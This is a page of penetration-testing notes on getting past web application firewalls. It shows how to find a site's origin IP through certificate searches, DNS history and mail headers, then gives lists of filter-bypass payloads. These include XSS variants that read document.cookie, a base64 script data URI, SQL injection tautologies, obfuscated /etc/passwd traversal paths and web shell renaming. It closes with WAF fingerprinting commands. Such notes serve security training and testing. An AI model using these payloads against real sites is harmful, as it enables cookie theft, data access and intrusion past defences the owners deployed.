---
title: WAF Evasion
category: Enumeration
order: 5
---

In this section I will explain techniques to found the original IP of the hosted webapp.

# SSL Certificates

First we need to look inside the SSL Certificate of the webapp in order to find the fingerprint \(SHA256\)

![Fingerprint of SSL Certifcate](/hackingnotes/images/fingerprint_ssl.png)

With [censys](https://censys.io/certificates) you can search different hosted webpages with the same SSL fingerprint, so these are from the same company.

* [https://censys.io/certificates](https://censys.io/certificates)

![Censys results.](/hackingnotes/images/censys_waf_bypass.png)

Once you obtained the different domains or IPs that have the same fingerprint try to discover the IPs and play with the `Host HTTP header.`

```
curl -kv https://190.12.34.42/
```

It's common that the companies buys a range of IPs, so you should need to check more parent IPs.

```
curl -kv https://190.12.34.40/
curl -kv https://190.12.34.41/
curl -kv https://190.12.34.43/
curl -kv https://190.12.34.44/
curl -kv https://190.12.34.45/
curl -kv https://190.12.34.46/
```

# DNS History

Some times the companies put a WAF on a web application, but they don't configure it properly and any source IP instead of only the WAF can request the server.

So we can check the DNS history with `viewdnsinfo` to search the old IP.

* [https://viewdns.info/iphistory/](https://viewdns.info/iphistory/)

![ViewDNS.info](/hackingnotes/images/viewdns_info.png)

Finally with `suip.biz` we can check which apps are hosted on a server.

* [https://suip.biz/?act=hostmap](https://suip.biz/?act=hostmap)

![ViewDNS.info](/hackingnotes/images/suip.png)

# Via SMTP Functionalities

SMTP headers can reveal a lot of value information. If a SMTP functionality is found on the web appliaction try to send a mail to a known recipient to check these headers in order to find the real webserver IP.

![SMTP Headers](/hackingnotes/images/smtp_headers.png)

# Bypassing blacklisting WAFs

The whitelisting mode is prone to false positives, which is the reason it is very common to find WAFs deployed in blacklisting mode rather than whitelisting mode.

The blacklisting mode is a collection of well-known attacks. WAF producers put together a list of rules to protect a web application against various attack vectors that are used to exploit the most common vulnerabilities.

So we can use different payloads to bypass some filters.

## Cross-Site Scripting (XSS)

* Instead of using `alert('xss')` or `alert(1)` we can choose a better option:
```
prompt('xss')
prompt(8)
confirm('xss')
confirm(8)
alert(/xss/.source)
window[/alert/.source](8)
```

* Instead of using `alert(document.cookie)` we can use:
```
with(document)alert(cookie)
alert(document['cookie'])
alert(document[/cookie/.source])
alert(document[/coo/.source+/kie/.source])
```

* Instead of using `<img src=x onerror=alert(1);>` we can use:

```
<svg/onload=alert(1)>
<video src=x onerror=alert(1);>
<audio src=x onerror=alert(1);>
```

* Instead of `javascript:alert(document.cookie)` we can use:
```
data:text/html:base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

## Blind SQL Injection (Blind SQLi)

* Instead of using `' or 1=1` we can use:
```
' or 6=6
' or 0x47=0x47
or char(32)=''
or 6 is not null
```
* Instead of `UNION SELECT` we can use:
```
UNION ALL SELECT
```

## Directory Traversal

* Instead of using `/etc/passwd` we can use:
```
/too/../etc/far/../passwd
/etc//passwd
/etc/ignore/../passwd
/etc/passwd.......
```

## Web Shell

* Instead of using `c99.php` , `r57.php` , `shell.aspx` , `cmd.jsp`, `CmdAsp.asp` we can use:
```
augh.php
```

# WAF Detection and Fingerprinting

WAF systems leave several footprints of their presence, which allow us to detect which WAF is in place.

`wafw00f` is a tool that can detect up to 20 different WAF products.

```
wafw00f www.example.com
```
Also it can be possible to detect the WAF vendor with a nmap script.
```
nmap --script=http-waf-fingerprint www.imperva.com -p 80
```
## Cookie Values

Some WAF systems reveal their presence through cookies.

| WAF Vendor | Cookies |
| :--- | :--- |
| Citrix Netscaler | n_saf, citrix_ns_id or NSC_ |
| F5 BIG-IP ASM | ^TS[a-zA-Z0-9]{3,6} |
| Barracuda | barra_counter_session and BNI__BARRACUDA_LB_COOKIE |

## Header Rewrite

Some WAFs rewrite the HTTP headers. Usually modify the Server header.

* Original Request
```
HTTP/1.1 200 OK
Date: Mon, 7 Apr 2014 10:10:50 GMT
Server: Apache (Unix)
Content-Type: text/html
Content-Length: 2506
```
* Modified Request
```
HTTP/1.1 404 Not Found
Date: Mon, 7 Apr 2014 10:11:06 GMT
Server: Netscape-Enterprise/6.1
Content-Type: text/html; 
Content-Length: 158
```